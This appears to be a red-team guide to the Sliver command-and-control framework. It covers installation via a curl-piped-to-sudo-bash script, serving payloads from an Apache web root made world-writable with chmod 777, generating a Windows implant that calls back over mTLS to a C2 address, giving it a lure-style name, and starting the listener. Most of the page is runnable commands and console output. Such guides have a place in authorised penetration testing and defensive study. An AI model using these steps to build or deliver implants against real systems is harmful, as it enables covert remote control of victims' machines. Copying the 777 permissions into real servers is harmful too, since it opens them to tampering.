# Sliver

### Installation

```
apt-get update -y 
apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
mkdir sliver 
cd sliver
curl https://sliver.sh/install|sudo bash
```

* Assuming `/usr/local/bin/` is in your path, your sliver server should be available in the shell as `sliver-server` and the client as `sliver`.

### Prepare a delivery method <a href="#prepare-a-delivery-method" id="prepare-a-delivery-method"></a>

On your C2 server, run `systemctl start apache2` to start a web server. You can now copy the implants you generate into the folder `/var/www/html` and Apache will serve them. To allow any system user to put a payload their, you can run `chmod -R 777 /var/www/html`.

### Generating the implant <a href="#generating-the-implant" id="generating-the-implant"></a>

Implant generation happens on the C2 server with the `generate` command. Connect to it and run `help generate` to read the extensive help page and learn about all the flags. Here is a selection of the most important flags for now:

* `--mtls 192.168.122.111`: Specifies that the implant should connect to the Sliver server using a mutually authenticated TLS connection. Other options would be `--wg` for WireGuard, `--http` for HTTP(S) connections or `--dns` for DNS-based C2.
* `--os windows`: specifies that we want to run the implant on Windows (which is the default, so we could omit this one). MacOS and Linux are also supported.
* `--arch amd64`" specifies that we want a 64-bit implant (also the default, could be omitted). Use `--arch 386` for a 32-bit one.
* `--format exe`: specifies that we want an executable file (again the default). Other options are `--format shared` for dynamic libraries, `--format service` for a Windows service binary (can be used with the `psexec` command) and `shellcode` (only windows).
* `--save /var/www/html/`: specifies the directory to save the binary to. I like to use the Apache web root.

```
sliver > generate --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html
```

### Fix Permissions&#x20;

The file `/var/www/html/MEDICAL_CHANGE.exe` will not be owned by the Apache system user and has very restrictive file system permissions. To make it accessible for Apache, run `sudo chown www-data:www-data /var/www/html/MEDICAL_CHANGE.exe`.

### Start Listener



Now start the mTLS listener on the C2 server using the `mtls` command. By default, it starts the listener on port 8888. You can view your listeners with the `jobs` command:

```
sliver > mtls

[*] Starting mTLS listener ...
sliver > 
[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888
```
